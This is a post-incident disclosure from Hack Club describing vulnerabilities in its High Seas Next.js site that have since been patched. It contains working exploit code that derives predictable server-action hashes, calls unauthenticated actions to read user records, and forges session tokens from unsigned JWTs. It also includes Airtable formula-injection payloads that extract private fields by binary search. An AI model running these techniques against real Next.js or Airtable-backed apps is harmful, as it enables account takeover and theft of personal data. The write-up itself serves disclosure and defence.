Jan 1 14:42: `@Toshit` informed a member of the High Seas team of a vulnerability privately.
Jan 1 16:31: Locked all Vercel deployments. https://hackclub.slack.com/archives/C07MS92E0J3/p1735767096234219?thread_ts=1735760565.330479&cid=C07MS92E0J3

*TL;DR: The issue was due to how Next.js's server actions are defined, wherein a privileged server function was able to be arbitrarily invoked, returning a small amount of user data; full name, email, and *

What Next calls *Server Actions* are actually a React 19 feature called [*Server Functions*](https://react.dev/reference/rsc/server-functions#importing-server-functions-from-client-components).
When you mark a function with the `"use server"` directive, it allows execution of the function from the frontend. This abstracts away setting up an API route in many cases, such as data fetching or form submission.

Consider the following example. It uses a server function, `getUsers` to fetch usernames and avatars. This subset of user data is safe to display on the frontend. In its current state, this code is secure.

```javascript
// utils.js
"use server"

async function rawUsers(offset) {
	// sql`` ensures safe interpolation.
	return await sql`SELECT * FROM user LIMIT 10 OFFSET ${OFFSET}`;
}

export async function getUsers() {
	const users = await rawUsers(0)
	
	return users.map((user) => ({
		title: user.username,
		avatarUrl: user.avatar
	}))
}
```

```jsx
// Users.jsx
"use client"

import { useEffect, useState } from "react"
import { getPosts }

export function Users({}) {
	const [users, setUsers] = useState(null)

	useEffect(() => {
		setUsers(await getUsers())
	}, [])

	if (!users) return <p>Loading users...</p>

	return (<div className="flex flex-col">
		{users.map((user) => (
			<div>
				<p>{user.username}</p>
				<img src={user.avatarUrl} />
			</div>
		))}
	</div>)
}
```

As it says in [the docs](https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions-and-mutations#client-components),
> To call a Server Action in a Client Component, create a new file and add the `"use server"` directive at the top of it. All exported functions within the file will be marked as Server Actions that can be reused in both Client and Server Components.

So to use our `getUsers` function in a client component, we need to mark the entire server module as `"use server"`. All **exported** functions will be available on the frontend. This is where the vulnerability lies.

When another developer comes along and wants to use `rawUsers`, they might prepend the `export` keyword to the `async function rawUsers(offset) {` line, then `import` it into one of their modules to use it elsewhere. Normally, this is the correct thing to do. Here, it's created a vulnerability. Now, anyone can call `rawUsers` via a HTTP request and get read access to *ALL* columns on `user`.

[This is a known footgun.](https://www.youtube.com/watch?v=yUm-ET8w_28)

I originally figured out how to call any nextjs server action while working on my [High Seas wonderdome client](https://github.com/r58Playz/highseas-wonderdome).
I was trying to figure out how to get doubloon stats like cursed/blessed status and remaining votes, which were provided by [the `safePerson` function](https://github.com/hackclub/high-seas/blob/04eb2fad9d22cc04b1606604a637204ab9c5fcef/src/app/utils/airtable.ts#L168) which is only exposed as a server action called in the frontend.

My [original approach](https://github.com/r58Playz/highseas-wonderdome/blob/279aed31933ebade4557f479d0aa24c1e82d3894/src/api.ts#L90-L111) was to "replay" the request the frontend made. Nextjs server actions are called with a POST request with the body being the arguments to the function. They use the `Next-Action` header to specify which function to call, and the header value is always some sort of hash that gets calculated at build time. It returns data in the React Server Component format. So, I copied the necessary headers and body to my code as a quick way to emulate what the High Seas frontend was doing to call the `safePerson` function. However, I thought this was fragile and wanted to get rid of this hardcoded hash that could change at any time in a future deployment, so I began digging into the Nextjs code.

Nextjs uses swc to parse and transform app code. This code is written in Rust and compiled before being distributed on npm as a dependency of nextjs in the package `@next/swc`. The code for generating an action ID on the server in the version of nextjs High Seas uses is [here](https://github.com/vercel/next.js/blob/v14.2.13/packages/next-swc/crates/next-custom-transforms/src/transforms/server_actions.rs#L1255-L1266).

This code takes a hash salt, the full path to the file containing the server action, and the function name of the server action. These values are SHA1 hashed in the format `{salt}{file}:{name}` and the hash is hex encoded. At first glance, it looks impossible to generate hashes outside of the nextjs build process due to the hash salt. However, this salt is **always empty** in the version of nextjs that High Seas uses for [backwards compatibility reasons](https://github.com/vercel/next.js/pull/69183) (it's also always empty in the canary build of nextjs at the time of writing this). As a result, if you know the path of the file the function you are create a hash for is in, you can create a hash. I also had the safePerson hash to test my hash generator against, making this reverse engineering process a lot easier. I knew that High Seas was hosted on the Vercel edge from all the Vercel errors I was getting in my wonderdome client, so all I had to do was figure out where Vercel's build system cloned GitHub projects, which was as simple as prepending a `pwd` to the build function. This directory happened to be `/vercel/path0/`, so the hash input for the `safePerson` function would be `/vercel/path0/src/app/utils/airtable.ts:safePerson`. The hash of this matches up with the hash that I hardcoded: `d483dc862f183641a65ff7b18ad1b9f1b4e4d49d`.

This is the code I used to call any server action:
```typescript
async function getActionHash(path: string, name: string) {
	const input = `/vercel/path0/${path}:${name}`;
	const hashed = await crypto.subtle.digest("SHA-1", new TextEncoder().encode(input));
	return [...new Uint8Array(hashed)].map(x => x.toString(16).padStart(2, '0')).join('');
}

async function callAction(path: string, name: string, args: any[], actionPath?: string) {
	const res = await fetch(`https://highseas.hackclub.com/${actionPath || ""}`, {
		"headers": {
			"accept": "text/x-component",
			"content-type": "text/plain;charset=UTF-8",
			"next-action": await getActionHash(path, name),
		},
		"body": JSON.stringify(args),
		"method": "POST"
	}).then(r => r.text());
	const components = res.split('\n').map(x => x.substring(x.indexOf(':') + 1));
	return components;
}
```
This code and any further snippets use my project [epoxy-tls](https://github.com/MercuryWorkshop/epoxy-tls/) to bypass CORS while fetching data end-to-end encrypted. `epoxy-tls` is where the `Response` object's `rawHeaders` property comes from later on.

While looking at the source of `safePerson`, I noticed that it calls `getSelfPerson` with the slack id from the current login token to get all of the person's data. [This function](https://github.com/hackclub/high-seas/blob/04eb2fad9d22cc04b1606604a637204ab9c5fcef/src/app/utils/airtable.ts#L6-L30) **did not have any authentication checks** and was exported, meaning it would automatically be turned into a server action by Nextjs due to the `'use server'` at the top of the file. Essentially, there was an unused API endpoint with **no authentication** that returned any slack id's data. This is the first vulnerability I found, and it was very easy to exploit due to the server action hash generator I had just made.

This is the original code I used to exploit the first vulnerability:
```typescript
async function selfPerson(id: string) {
	const ret = await callAction("src/app/utils/airtable.ts", "getSelfPerson", [id]);
	return JSON.parse(`{"id":"` + (ret)[ret.length - 2].split(`{"id":"`)[1]);
}
```

After finding this vulnerability, I wanted to see if the authentication functions also had something similar. The [`createSlackSession` function](https://github.com/hackclub/high-seas/blob/04eb2fad9d22cc04b1606604a637204ab9c5fcef/src/app/utils/auth.ts#L121-L189) was my main target, as at first glance it did not look like it verified anything because it was only used by the [slack login endpoint](https://github.com/hackclub/high-seas/blob/04eb2fad9d22cc04b1606604a637204ab9c5fcef/src/app/api/slack_redirect/route.ts). It calls `parseJwt` which **does not verify that the JWT passed in is properly signed**. `parseJwt` only extracts the JWT payload and returns it, and the rest of the `createSlackSession` code does not verify that the parsed JWT payload is valid either. As a result, I was able to create tokens for any slack ID as long as I was able to generate a JWT that looked valid enough. I used one of the many JWT libraries for JS to encode my custom payload that only had the target slack ID and the email. I was able to generate tokens at will with the `createSlackSession` function, and they were returned in the `Set-Cookie` header as the `hs-session` cookie as the code assumed it was being called in the slack login endpoint.

This is the original code I used to exploit the second vulnerability:
```typescript
async function generateToken(id: string) {
	const params = (action: string, args: any[]) => {
		return {
			"headers": {
				"accept": "text/x-component",
				"content-type": "text/plain;charset=UTF-8",
				"next-action": action
			},
			"body": JSON.stringify(args),
			"method": "POST"
		}
	};
	const encode = (input: string) => {
		let unencoded = new TextEncoder().encode(input)
		const CHUNK_SIZE = 0x8000
		const arr = []
		for (let i = 0; i < unencoded.length; i += CHUNK_SIZE) {
			// @ts-expect-error
			arr.push(String.fromCharCode.apply(null, unencoded.subarray(i, i + CHUNK_SIZE)))
		}
		return btoa(arr.join('')).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_')
	}

	// src/app/utils/airtable.ts : getSelfPerson
	const personRes = await fetch("https://highseas.hackclub.com/", params("fdfebd3d5565f8459d07200b9c50d7d6ab4dec39", [id])).then(r => r.text());
	const person = JSON.parse(`{"id":"` + personRes.split("\n").map(x => x.substring(x.indexOf(":") + 1))[1].split(`{"id":"`)[1]);
	const jwt = `.${encode(JSON.stringify({ sub: id, person: person.fields.email, }))}.`;
	// src/app/utils/auth.ts : createSlackSession
	const sessionRes = await fetch("https://highseas.hackclub.com/", params("f0e8ca9e5e71bfe94ec69fa168a7b6973d66134b", [jwt]));

	// @ts-expect-error
	return decodeURIComponent(sessionRes.rawHeaders["set-cookie"].split(";")[0].split("=")[1])
}
```

I then shared this code with @FoxMoss who continued on and created the lookup injection.

I was made aware that there was issues with the High Seas code in the afternoon of January 1st. Not many replication details, I did however get the code to request arbitrary NextJs actions that @r58 had wrote. So after their vulnerability was patched I started to comb through the code base. First thing I noticed was unescaped requests to this tool called [Airtable](https://github.com/hackclub/high-seas/blob/a73b9a864c36c3831142efa7967e582e3777e5b6/src/app/utils/airtable.ts#L17) for grabing user data. I had never heard of Airtable especially for databases, and thats for good reason. **Airtable is not a database**, it's a fancy spreadsheet for business automation. Airtable did expose an API for requests, but it has [no standard way of sanitizing requests](https://community.airtable.com/t5/development-apis/standard-way-to-prevent-formula-injections-when-using-airtable/td-p/121261/page/2). This is bad because Hack Club passes unchecked user data right into into Airtable formulas multiple times.  

Lets breakdown how to do Airtable formula injection to give us arbitrary user data. Taking [this function](https://github.com/hackclub/high-seas/blob/a73b9a864c36c3831142efa7967e582e3777e5b6/src/app/utils/airtable.ts#L76) from the first vulnerability patch, the formula template is as follows (If we ignore the `encodeURIComponent`, which won't be relevant.) `https://middleman.hackclub.com/airtable/v0/appTeNFYcUiYfGcR6/ships?filterByFormula={autonumber}='${num}'` and it returns some surface level data from the autonumber, like the corresponding email, slack id, and user id, normal behavior. But we can easily just make Airtable give us a random entry if we give it something like this.
```sql
{autonumber}='' & {autonumber} & ''
```
Now to let us get specific info like doubloons_balance for a certain user we can just only give autonumber back to Airtable if doubloon_balance and the slack_id matches a specific criteria.
```sql
{autonumber}='' & IF(AND({doubloon_balance} > 100, {slack_id}='U07UY7CPZ53'), {autonumber}, 0) & ''
```
If the stated slack id is indeed above 100 it returns the data, if not it returns an error. Now if I wanted the exact number I could check every number, or I could apply a simple [binary search](https://en.wikipedia.org/wiki/Binary_search), If I start with some realistic bounds say 0-10000 I can chop the search area in half until I converge on a whole number. 

Numbers are fine, but if we need actually exploitable data we need to be able to crack strings as well, first we can crack the string length using the `LEN()` Airtable function. Then we iterate each character with some simple string manipulation.
```sql
RIGHT(LEFT({fullname}, ${char_index} + 1), 1)
```
After that we can apply the same binary search, approach this time with ASCII values and a little regex.
```sql
{autonumber}='' & IF(AND(REGEX_MATCH(RIGHT(LEFT({${target}}, ${index} + 1), 1), '[!-o]') = TRUE(), {slack_id}='U07UY7CPZ53'), {autonumber}, 0) & ''
``` 

If we want to login to an account, some users have an auto generated magic_auth_token in their row which magically gives any perpetrator with your magic token an easy way to login to your account via `https://highseas.hackclub.com/shipyard/?magic_auth_token=...` . This vulnerability could also be used in the same way @r58 did, by grabbing the email and creating a jwt, but I stopped here. So I wrote that up as a program added some sick ass loading bars and sent that off to the High Sea's team. Here's a recording of this while the bugs were still vulnerable.

![[High Seas Vuln GIF - FoxMoss.webp]]

They implemented a preliminary fix, but since the injection was source formula agnostic I was able to expose and help patch a couple other places where Airtable could be used to extract information.


---

So, what actually happened? TL;DR, nothing. We checked our logs and no data was stolen.

The person records contains these fields:

```
ships, slack_id, autonumber, email, battles, orders, shop_true, address, YSWS Verification User, waka_last_synced_from_db, waka_last_heartbeat, waka_known_machine_count, waka_known_machines, waka_known_installation_count, waka_known_installations, waka_first_heartbeat, zapier_loops_marked_signed_up_at, zapier_loops_marked_wakatime_installed_at, waka_total_hours_logged, has_received_hakatime_install_nudge, contest, last_step_completed, auto_num, tavern_rsvp_status, address_geocode, address_latitude, address_longitude, tavern_map_geocode, taverns_attendee, Manual sort, nearest_tavern_1, nearest_tavern_2, nearest_tavern_3, nearest_tavern_1_distance, nearest_tavern_2_distance, nearest_tavern_3_distance, rsvp_nudge_sent, first_name, last_name, identifier, battles__explanation, agggregated_battle_explanations, record_id, vote_quality_multiplier, vote_count, votes_expended, vote_balance, shipped_ship_count, verification_status, full_name, all_orders_string, academy_completed, preexisting_user, user_has_graduated, country, all_project_repo_urls, battles__uniqueness_enforcement_string, ships_awaiting_vote_requirement_count, ships_with_vote_requirement_met_count, minimum_pending_vote_requirement, vote_balance_minus_minimum_pending_requirement, votes_remaining_for_next_pending_ship, votes_required_for_all_pending_ships, votes_remaining_for_all_pending_ships, unique_vote_count, duplicate_vote_count, unique_vote_explanation_count, aggregated_battle_explanations_length, aggregate_discordance, mean_discordance, all_battle_ship_autonumbers, all_battle_ship_autonumbers_unique, all_battle_ship_autonumber_strings, magic_auth_link, likely_test_user, magic_auth_message, orders_awaiting_mailout, all_order_items, has_ordered_free_stickers, orders__item_name, verified_eligible, verification_alum, orders__items, free_stickers_dupe_check, staged_ships_count, last_activity_time, days_since_last_activity, stale, hours_since_last_activity, sniffable_vote_count, telemetry_vote_count, total_vote_count, duplicate_vote_explanation_count, duplicate_vote_explanation_percentage, duplicate_explanation_trust_factor, mean_vote_time, time_trust_factor, consensus_violation_coefficient, consensus_violation_trust_factor, mean_rating_difference, mean_absolute_rating_difference, accordance_coefficient, accordance_coefficient_trust_factor, voting_trust_factor_sans_clickthrough, voting_trust_factor, verification_updated_at, duplicate_vote_explanation_count_prior_week, mean_consensus_disagreement, consensus_disagreement_coefficient, total_ships, vote_count_prior_week, aggregated_rating_differences, referral_link, impersonation_link, contest__all_slack_ids, order_count_no_free_stickers, paid_out_ship_count, hakatime_has_coded, hakatime_installed, tutorial_ship_count, stage, doubloons_paid, contest__doubloons_per_dollar, dollars_paid, total_real_money_we_spent, amount_earned_vs_fulfillment_cost, count_battles_exact_mention, battles_exact_mention_percentage, slack_profile_url, all_project_demo_urls, total_hours_shipped, average_doubloons_per_hour, created_at, days_since_joining, daily_hours_logged, days_since_first_heartbeat, daily_hours_shipped, days_between_first_and_last_heartbeats, first_heartbeat_modified_at, orders__item_name_list, dollars_fulfilled, doubloons_granted, referral_credit_count, doubloons_received, didn't_complete_tutorial_bc_of_bug, stuck_in_tutorial_generally, ysws_submission_total_submitted_weighted_projects, address__formatted, tavern_map_marker_size, status (from orders), tavern_map_coordinates, Tavern City, slack_profile, location_confirmed, rsvp_partially_complete, nearest_tavern_1_locality, nearest_tavern_2_locality, nearest_tavern_3_locality, nearest_tavern_1_organizer_needed, doubloons_spent, doubloons_balance, settled_tickets
```

The only data that was accessed using the methods above was Toshit and FoxMoss accessing their own records.

The next event we run will have a much stronger focus on security (and won't use Next.js!).

